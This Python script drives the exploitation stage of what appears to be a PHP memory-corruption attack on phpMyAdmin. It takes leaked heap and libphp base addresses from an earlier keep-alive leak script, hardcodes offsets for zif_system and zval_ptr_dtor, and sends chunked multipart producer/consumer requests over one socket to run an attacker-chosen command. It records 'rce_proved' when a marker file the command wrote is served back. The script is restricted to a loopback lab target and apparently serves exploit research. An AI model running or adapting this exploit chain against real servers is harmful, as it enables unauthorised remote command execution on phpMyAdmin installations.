#!/usr/bin/env python3
"""Run the exact phpMyAdmin Fire pair on one HTTP/1.1 connection.

This is an isolated loopback diagnostic.  It consumes a successful receipt
from ``pma_keepalive_leak.py``, keeps the hash-pinned engine's rotate transport
unchanged, then supplies one persistent socket to ``Fire.run()``.  Success
requires a pre-attack 404, identical socket evidence for the Fire producer and
consumer, an independently fetched exact marker body, and a healthy target.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
from pathlib import Path
import re
import socket
import sys
import threading
import time
from datetime import datetime, timezone
from urllib.parse import urlsplit


HERE = Path(__file__).resolve().parent
LEAK_DRIVER = HERE / "pma_keepalive_leak.py"
EXPECTED_LEAK_DRIVER_SHA256 = (
    "30d581a068a2addbc04dc1776847b63cb4c2034c2459a364386d67eb6f36bdca"
)
GATE = HERE.parent / "prior-art-php2shell-joas" / "stock_phpmyadmin_gate.py"
EXPECTED_GATE_SHA256 = (
    "8a513462f38ba3dd6e9eb95aa88f4ec4064b58d196e986e6a26b33972f448cec"
)


def file_sha256(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as stream:
        for block in iter(lambda: stream.read(1 << 20), b""):
            digest.update(block)
    return digest.hexdigest()


if file_sha256(LEAK_DRIVER) != EXPECTED_LEAK_DRIVER_SHA256:
    raise RuntimeError("refusing an unpinned keep-alive leak diagnostic")
if file_sha256(GATE) != EXPECTED_GATE_SHA256:
    raise RuntimeError("refusing an unpinned authoritative phpMyAdmin gate")
sys.path.insert(0, str(HERE))

import pma_keepalive_leak as keep  # type: ignore  # hash-pinned local helper


stock = keep.stock
TARGET_URL = "http://127.0.0.1:18212/show_config_errors.php"
HOST_HEADER = "x"
ZIF_SYSTEM = 0x465370
ZVAL_PTR_DTOR = 0x65EB60
TABLE_OFFSET = 0x690D8


def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat()


def atomic_json(path: Path, document: object) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    temporary = path.with_name(path.name + ".new")
    temporary.write_text(json.dumps(document, indent=2) + "\n", encoding="utf-8")
    os.replace(temporary, path)


def response_headers(raw: bytes) -> dict[str, list[str]]:
    head, separator, _ = raw.partition(b"\r\n\r\n")
    if not separator:
        return {}
    try:
        _, _, _, headers = keep.parse_header_block(head + separator)
        return headers
    except Exception:
        return {}


def entity_body(raw: bytes, headers: dict[str, list[str]]) -> bytes:
    _, separator, wire = raw.partition(b"\r\n\r\n")
    if not separator:
        raise keep.DiagnosticStopped("HTTP response lacked a header terminator")
    transfer = ",".join(headers.get("transfer-encoding", [])).lower()
    if "chunked" not in transfer:
        length_values = headers.get("content-length", [])
        if length_values:
            try:
                length = int(length_values[-1], 10)
            except ValueError as exc:
                raise keep.DiagnosticStopped("invalid GET Content-Length") from exc
            if len(wire) != length:
                raise keep.DiagnosticStopped("saved GET body length did not match framing")
        return wire

    cursor = 0
    decoded = bytearray()
    while True:
        end = wire.find(b"\r\n", cursor)
        if end < 0:
            raise keep.DiagnosticStopped("truncated chunk-size line")
        token = wire[cursor:end].split(b";", 1)[0].strip()
        try:
            size = int(token, 16)
        except ValueError as exc:
            raise keep.DiagnosticStopped("invalid saved chunk size") from exc
        cursor = end + 2
        if size == 0:
            # read_response() has already validated and retained the terminal
            # chunk/trailer framing in the raw receipt.
            return bytes(decoded)
        if cursor + size + 2 > len(wire) or wire[cursor + size:cursor + size + 2] != b"\r\n":
            raise keep.DiagnosticStopped("truncated saved response chunk")
        decoded.extend(wire[cursor:cursor + size])
        cursor += size + 2


def one_get(url: str, host_header: str, path: str, timeout: float,
            evidence: Path, label: str, cap: int = 2 << 20) -> tuple[dict[str, object], bytes]:
    parsed = urlsplit(url)
    assert parsed.hostname == "127.0.0.1" and parsed.port is not None
    request = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        "Connection: close\r\n\r\n"
    ).encode()
    (evidence / f"{label}.request.raw").write_bytes(request)
    sock = socket.create_connection((parsed.hostname, parsed.port), timeout)
    sock.settimeout(timeout)
    try:
        sock.sendall(request)
        reader = keep.SocketReader(sock)
        document, raw = keep.read_response(sock, reader, "GET", cap)
    finally:
        sock.close()
    headers = response_headers(raw)
    document.update({
        "x_powered_by": ",".join(headers.get("x-powered-by", [])),
        "content_type": ",".join(headers.get("content-type", [])),
    })
    body = entity_body(raw, headers)
    document.update({
        "body_bytes_saved": len(body),
        "body_sha256": hashlib.sha256(body).hexdigest(),
    })
    (evidence / f"{label}.response.raw").write_bytes(raw)
    (evidence / f"{label}.body.bin").write_bytes(body)
    return document, body


class FirePersistentEndpoint(keep.PersistentEndpoint):
    """Endpoint-compatible Fire transport for a chunked -> chunked pair."""

    def post(self, parts, boundary: bytes, *, chunked: bool,
             read_cap: int = 1 << 20, timeout: float | None = None,
             cookie: str | None = None, cookie_prefix: str = "",
             extra_headers: bytes = b"") -> bytes:
        label = "fire_producer" if self.call_index == 0 else "fire_consumer"
        self.call_index += 1
        if self.call_index > 2:
            raise keep.DiagnosticStopped("Fire.run issued more than two persistent requests")
        if not self.reusable:
            raise keep.DiagnosticStopped(
                f"refusing {label} on non-reusable socket: {self.closed_reason}"
            )
        if not chunked:
            raise keep.DiagnosticStopped(f"{label} unexpectedly lost chunked framing")

        effective_timeout = timeout or self.timeout
        self.sock.settimeout(effective_timeout)
        cookie_header = (
            f"Cookie: {cookie_prefix}PHPSESSID={cookie}\r\n" if cookie else ""
        )
        head = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host_header}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
            f"Transfer-Encoding: chunked\r\n{cookie_header}"
            "Connection: keep-alive\r\n"
        ).encode() + extra_headers + b"\r\n"
        (self.evidence / f"{label}.request-head.raw").write_bytes(head)

        before_identity = keep.socket_identity(self.sock)
        history_start = len(self.reader.history)
        response_box: dict[str, object] = {}

        def response_reader() -> None:
            try:
                document, raw = keep.read_response(
                    self.sock, self.reader, "POST", max(read_cap, 2 << 20)
                )
                response_box["document"] = document
                response_box["raw"] = raw
            except Exception as exc:
                response_box["error"] = f"{type(exc).__name__}: {exc}"
                response_box["partial"] = bytes(self.reader.history[history_start:])

        thread = threading.Thread(
            target=response_reader,
            name=f"{label}-response-reader",
            daemon=True,
        )
        thread.start()
        request_hash = hashlib.sha256(head)
        request_bytes = len(head)
        request_fully_sent = False
        send_error: str | None = None
        started = time.monotonic()
        try:
            self.sock.sendall(head)
            for block in stock.Endpoint.body_stream(parts, boundary, chunked):
                request_hash.update(block)
                self.sock.sendall(block)
                request_bytes += len(block)
            request_fully_sent = True
        except OSError as exc:
            send_error = f"{type(exc).__name__}: {exc}"

        thread.join(effective_timeout + 2.0)
        parser_timed_out = thread.is_alive()
        if parser_timed_out:
            try:
                self.sock.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            thread.join(timeout=2.0)
            response_box.setdefault("error", f"{label} response parser timed out")
            response_box.setdefault(
                "partial", bytes(self.reader.history[history_start:])
            )

        after_identity = keep.socket_identity(self.sock)
        common: dict[str, object] = {
            "label": label,
            "socket_before": before_identity,
            "socket_after": after_identity,
            "same_python_socket": (
                before_identity["python_object_id"] == after_identity["python_object_id"]
            ),
            "same_fileno": before_identity["fileno"] == after_identity["fileno"],
            "same_local_endpoint": before_identity["local"] == after_identity["local"],
            "same_peer_endpoint": before_identity["peer"] == after_identity["peer"],
            "request_head_sha256": hashlib.sha256(head).hexdigest(),
            "request_stream_sha256": request_hash.hexdigest(),
            "request_bytes_sent": request_bytes,
            "request_fully_sent": request_fully_sent,
            "send_error": send_error,
            "elapsed_seconds": time.monotonic() - started,
        }

        if "error" in response_box:
            partial = response_box.get("partial", b"")
            assert isinstance(partial, bytes)
            (self.evidence / f"{label}.response-partial.raw").write_bytes(partial)
            common.update({
                "response_complete": False,
                "response_error": str(response_box["error"]),
                "partial_response_bytes": len(partial),
                "partial_response_sha256": hashlib.sha256(partial).hexdigest(),
                "will_close": True,
            })
            document = common
            raw = partial
        else:
            parsed_document = response_box["document"]
            raw = response_box["raw"]
            assert isinstance(parsed_document, dict) and isinstance(raw, bytes)
            parsed_document.update(common)
            parsed_document["response_complete"] = True
            document = parsed_document
            (self.evidence / f"{label}.response.raw").write_bytes(raw)

        exchanges = self.receipt["exchanges"]
        assert isinstance(exchanges, list)
        exchanges.append(document)
        self.receipt["persistent_socket_current"] = after_identity
        self.save()

        response_closed = bool(document.get("will_close"))
        if send_error is not None or response_closed or parser_timed_out:
            self.reusable = False
            self.closed_reason = (
                f"{label} send failed: {send_error}" if send_error is not None
                else f"{label} response was not reusable"
            )
            self.receipt["persistent_socket_reusable"] = False
            self.receipt["persistent_socket_closed_reason"] = self.closed_reason
            self.save()

        if label == "fire_producer" and (
            not request_fully_sent or not document.get("response_complete") or response_closed
        ):
            raise keep.DiagnosticStopped(
                "Fire producer did not complete with a reusable response"
            )
        # A Fire consumer may terminate the worker during teardown.  The caller
        # still requires a fully sent request plus independent exact HTTP proof.
        return raw


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Run the exact Fire producer/consumer on one loopback socket."
    )
    parser.add_argument("--url", default=TARGET_URL)
    parser.add_argument("--host-header", default=HOST_HEADER)
    parser.add_argument("--leak-receipt", type=Path, required=True)
    parser.add_argument("--cmd", required=True)
    parser.add_argument("--fetch", required=True)
    parser.add_argument("--expect", required=True)
    parser.add_argument("--attempts", type=int, default=1)
    parser.add_argument("--timeout", type=float, default=180.0)
    parser.add_argument("--out", type=Path)
    parser.add_argument("--ack-exact-profile", action="store_true")
    args = parser.parse_args()
    parsed = urlsplit(args.url)
    if (
        parsed.scheme != "http"
        or parsed.hostname != "127.0.0.1"
        or parsed.port not in (18212, 18213)
        or parsed.path != "/show_config_errors.php"
        or parsed.query
    ):
        parser.error("--url must be the explicit loopback 18212/18213 diagnostic route")
    if args.host_header != "x":
        parser.error("--host-header must be x")
    if not args.ack_exact_profile:
        parser.error("--ack-exact-profile is required")
    if not 1 <= args.attempts <= 6:
        parser.error("--attempts must be within 1..6")
    if not 10.0 <= args.timeout <= 300.0:
        parser.error("--timeout must be within 10..300 seconds")
    command = args.cmd.encode()
    expected = args.expect.encode()
    if not command or len(command) > 14 or b"\0" in command:
        parser.error("--cmd must be 1..14 bytes without NUL")
    if not re.fullmatch(r"/[a-z0-9]{1,8}", args.fetch):
        parser.error("--fetch must be a short root-relative lowercase marker path")
    if not expected or len(expected) > 32 or b"\0" in expected:
        parser.error("--expect must be 1..32 bytes without NUL")
    return args


def main() -> int:
    args = parse_args()
    leak_receipt_path = args.leak_receipt.resolve()
    leak_receipt = json.loads(leak_receipt_path.read_text(encoding="utf-8"))
    if leak_receipt.get("status") != "keepalive_leak_proved":
        raise keep.DiagnosticStopped("input leak receipt was not successful")
    if leak_receipt.get("target") != args.url or leak_receipt.get("host_header") != "x":
        raise keep.DiagnosticStopped("input leak receipt targets a different profile")
    if leak_receipt.get("engine_sha256") != keep.EXPECTED_ENGINE_SHA256:
        raise keep.DiagnosticStopped("input leak receipt has a different engine")
    heap = int(leak_receipt["heap"], 0)
    module = int(leak_receipt["libphp"], 0)
    if not heap or not module:
        raise keep.DiagnosticStopped("input leak receipt has zero bases")

    stamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    evidence = (
        args.out.resolve()
        if args.out is not None
        else (HERE / "evidence" / f"pma-keepalive-fire-{stamp}-{os.getpid()}").resolve()
    )
    evidence.mkdir(parents=True, exist_ok=False)
    receipt_path = evidence / "receipt.json"
    receipt: dict[str, object] = {
        "schema": "q618-pma-keepalive-fire-v1",
        "status": "started",
        "started_utc": utc_now(),
        "target": args.url,
        "host_header": args.host_header,
        "exact_profile_acknowledged": True,
        "blockers_started_by_diagnostic": 0,
        "command": args.cmd,
        "fetch": args.fetch,
        "expected_body_text": args.expect,
        "expected_body_hex": args.expect.encode().hex(),
        "input_leak_receipt": str(leak_receipt_path),
        "input_leak_receipt_sha256": file_sha256(leak_receipt_path),
        "input_heap": hex(heap),
        "input_libphp": hex(module),
        "engine": str(keep.ENGINE),
        "engine_sha256": keep.EXPECTED_ENGINE_SHA256,
        "authoritative_gate": str(GATE),
        "authoritative_gate_sha256": EXPECTED_GATE_SHA256,
        "diagnostic_sha256": file_sha256(Path(__file__).resolve()),
        "offsets": {
            "zif_system": hex(ZIF_SYSTEM),
            "zval_ptr_dtor": hex(ZVAL_PTR_DTOR),
            "table": hex(TABLE_OFFSET),
        },
        "rotate_transport": "original hash-pinned Fire.rotate Endpoint.post",
        "fire_transport": "one diagnostic HTTP/1.1 socket per Fire producer/consumer pair",
        "attempts": [],
    }

    def save() -> None:
        atomic_json(receipt_path, receipt)

    save()
    endpoint = stock.Endpoint(args.url, args.timeout)
    endpoint.host_override = args.host_header
    endpoint.host_header = args.host_header
    expected = args.expect.encode()
    try:
        health_before, health_body = one_get(
            args.url, args.host_header, "/", args.timeout, evidence, "health-before"
        )
        receipt["health_before"] = health_before
        if health_before.get("status") != 200 or b"phpMyAdmin" not in health_body:
            raise keep.DiagnosticStopped("target was not a functional phpMyAdmin before Fire")

        preproof, preproof_body = one_get(
            args.url, args.host_header, args.fetch, args.timeout, evidence, "proof-before"
        )
        receipt["proof_before"] = preproof
        receipt["proof_before_body_hex"] = preproof_body.hex()
        if preproof.get("status") != 404:
            raise keep.DiagnosticStopped("fresh marker path did not return HTTP 404")
        save()

        fire = stock.Fire(endpoint, ZIF_SYSTEM, ZVAL_PTR_DTOR, True)
        for attempt_number in range(1, args.attempts + 1):
            attempt_dir = evidence / f"attempt-{attempt_number}"
            attempt_dir.mkdir()
            attempt: dict[str, object] = {
                "attempt": attempt_number,
                "status": "started",
                "rotate_started_utc": utc_now(),
                "exchanges": [],
            }
            attempts = receipt["attempts"]
            assert isinstance(attempts, list)
            attempts.append(attempt)
            save()

            fire.rotate()
            attempt["rotate_completed_utc"] = utc_now()
            persistent = FirePersistentEndpoint(
                args.url, args.timeout, args.host_header, attempt_dir, attempt, save
            )
            attempt["persistent_socket_initial"] = persistent.initial_identity
            attempt["persistent_socket_reusable"] = True
            save()
            fire_error: str | None = None
            try:
                fire_on_socket = stock.Fire(
                    persistent, ZIF_SYSTEM, ZVAL_PTR_DTOR, True
                )
                fire_on_socket.run(
                    heap,
                    module,
                    args.cmd.encode(),
                    table_offset=TABLE_OFFSET,
                    cookie="a" * 32,
                    spray=15,
                    live_n=0,
                    live_len=31,
                    fill_n=0,
                    carrier_mode="adopted",
                    progress_late=False,
                    pads=stock.parse_pads(""),
                    decoy_n=2,
                )
            except Exception as exc:
                fire_error = f"{type(exc).__name__}: {exc}"
            finally:
                persistent.close()

            exchanges = attempt["exchanges"]
            assert isinstance(exchanges, list)
            same_socket = (
                len(exchanges) == 2
                and exchanges[0]["socket_before"]["python_object_id"]
                == exchanges[1]["socket_before"]["python_object_id"]
                and exchanges[0]["socket_before"]["fileno"]
                == exchanges[1]["socket_before"]["fileno"]
                and exchanges[0]["socket_before"]["local"]
                == exchanges[1]["socket_before"]["local"]
                and exchanges[0]["socket_before"]["peer"]
                == exchanges[1]["socket_before"]["peer"]
            )
            consumer_fully_sent = (
                len(exchanges) == 2
                and bool(exchanges[1].get("request_fully_sent"))
            )
            attempt.update({
                "same_socket_for_fire_producer_consumer": same_socket,
                "consumer_request_fully_sent": consumer_fully_sent,
                "fire_error": fire_error,
            })
            time.sleep(0.8)
            proof, proof_body = one_get(
                args.url,
                args.host_header,
                args.fetch,
                args.timeout,
                attempt_dir,
                "proof-after",
            )
            attempt["proof_after"] = proof
            attempt["proof_after_body_hex"] = proof_body.hex()
            exact_proof = proof.get("status") == 200 and proof_body == expected
            attempt["proof_exact"] = exact_proof
            if exact_proof and same_socket and consumer_fully_sent:
                attempt["status"] = "rce_proved"
                receipt["status"] = "rce_proved"
                receipt["successful_attempt"] = attempt_number
                receipt["proof_fresh"] = True
                receipt["same_socket_fire_proved"] = True
                break
            attempt["status"] = "fire_failed_no_exact_proof"
            save()

        health_after, health_after_body = one_get(
            args.url, args.host_header, "/", args.timeout, evidence, "health-after"
        )
        receipt["health_after"] = health_after
        receipt["target_healthy_after"] = (
            health_after.get("status") == 200 and b"phpMyAdmin" in health_after_body
        )
        if not receipt["target_healthy_after"]:
            raise keep.DiagnosticStopped("target was not healthy after Fire")
        if receipt.get("status") != "rce_proved":
            receipt["status"] = "fire_failed_no_exact_proof"
            receipt["proof_fresh"] = False
            raise keep.DiagnosticStopped("Fire produced no fresh exact HTTP proof")
        receipt["ended_utc"] = utc_now()
        save()
        print(json.dumps(receipt, indent=2))
        print(f"evidence: {evidence}")
        return 0
    except Exception as exc:
        previous_status = str(receipt.get("status", "started"))
        if previous_status == "rce_proved":
            receipt["status"] = "proof_observed_but_postcondition_failed"
        elif previous_status == "started":
            receipt["status"] = "stopped"
        receipt["error"] = f"{type(exc).__name__}: {exc}"
        receipt["ended_utc"] = utc_now()
        save()
        print(json.dumps(receipt, indent=2))
        print(f"evidence: {evidence}")
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
